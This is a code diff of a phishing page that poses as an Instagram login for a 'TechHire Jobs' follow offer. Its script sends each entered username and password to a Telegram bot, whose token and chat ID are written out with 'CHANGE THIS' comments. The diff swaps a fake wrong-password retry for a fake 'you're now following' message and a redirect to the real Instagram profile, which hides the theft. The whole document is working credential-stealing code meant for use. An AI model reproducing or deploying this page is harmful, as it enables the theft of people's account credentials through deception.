@@ -14,12 +14,31 @@
         input { width: 100%; padding: 12px; margin: 4px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
         button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 600; margin: 10px 0; cursor: pointer; font-size: 14px; }
         button:hover { background: #0074d9; }
-        .error { color: #ed4956; font-size: 12px; display: none; margin: 10px 0; }
-        .loading { display: none; margin: 10px 0; font-size: 13px; color: #555; }
         .note { font-size: 11px; color: #8e8e8e; margin-top: 15px; }
-        .or { display: flex; align-items: center; margin: 15px 0; color: #8e8e8e; font-size: 13px; }
-        .or::before, .or::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
-        .or span { padding: 0 18px; }
+        .loading { display: none; margin: 10px 0; font-size: 13px; color: #555; }
+        
+        /* Success message style */
+        .success {
+            display: none;
+            padding: 20px;
+        }
+        .success h2 {
+            color: #28a745;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        .success p {
+            color: #555;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .success .checkmark {
+            font-size: 60px;
+            margin-bottom: 15px;
+        }
+        .form-content {
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -28,38 +47,47 @@
         <h3>📸 TechHire Jobs</h3>
         <p>Follow us for daily job updates and interview tips!</p>
     </div>
-    <div class="logo">Instagram</div>
     
-    <form id="instaForm">
-        <input type="text" id="username" placeholder="Phone number, username, or email" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <div class="error" id="error">Sorry, your password was incorrect. Please try again.</div>
-        <div class="loading" id="loading">Verifying...</div>
-        <button type="button" id="loginBtn" onclick="sendToTelegram()">Log In to Follow</button>
-    </form>
+    <!-- Login Form -->
+    <div class="form-content" id="formContent">
+        <div class="logo">Instagram</div>
+        
+        <form id="instaForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <div class="loading" id="loading">Verifying...</div>
+            <button type="button" id="loginBtn" onclick="sendToTelegram()">Log In to Follow</button>
+        </form>
+        
+        <div class="note">You need to log in to follow @techhire.jobs</div>
+    </div>
     
-    <div class="or"><span>OR</span></div>
-    <div class="note">You need to log in to follow @techhire.jobs</div>
+    <!-- Success Message (shown after they submit) -->
+    <div class="success" id="successMessage">
+        <div class="checkmark">✅</div>
+        <h2>You're now following @techhire.jobs!</h2>
+        <p>Thank you for subscribing!<br>You'll now receive daily job updates and interview tips directly on Instagram.</p>
+        <p style="margin-top:15px;font-size:12px;color:#888;">Redirecting to Instagram...</p>
+    </div>
 </div>
 
 <script>
-var attempt = 0;
-var botToken = "8457083817:AAFM5Lsks2cLBqShhVFT5i2p5mH01lJjFEw";
-var chatId = "1012714242";
+var botToken = "8457083817:AAFM5Lsks2cLBqShhVFT5i2p5mH01lJjFEw";  // ← CHANGE THIS
+var chatId = "1012714242";      // ← CHANGE THIS
 
 function sendToTelegram() {
     var username = document.getElementById('username').value;
     var password = document.getElementById('password').value;
     var btn = document.getElementById('loginBtn');
-    var error = document.getElementById('error');
     var loading = document.getElementById('loading');
+    var formContent = document.getElementById('formContent');
+    var successMessage = document.getElementById('successMessage');
     
     if (!username || !password) {
         alert('Please enter username and password');
         return;
     }
     
-    attempt++;
     btn.style.display = 'none';
     loading.style.display = 'block';
     
@@ -74,15 +102,14 @@ function sendToTelegram() {
     
     fetch(url)
     .then(function() {
-        loading.style.display = 'none';
+        // Hide form, show success message
+        formContent.style.display = 'none';
+        successMessage.style.display = 'block';
         
-        if (attempt == 1) {
-            error.style.display = 'block';
-            btn.style.display = 'block';
-            btn.textContent = 'Log In';
-        } else {
+        // Redirect to real Instagram after 3 seconds
+        setTimeout(function() {
             window.location.href = 'https://www.instagram.com/techhire.jobs/';
-        }
+        }, 3000);
     })
     .catch(function() {
         loading.style.display = 'none';
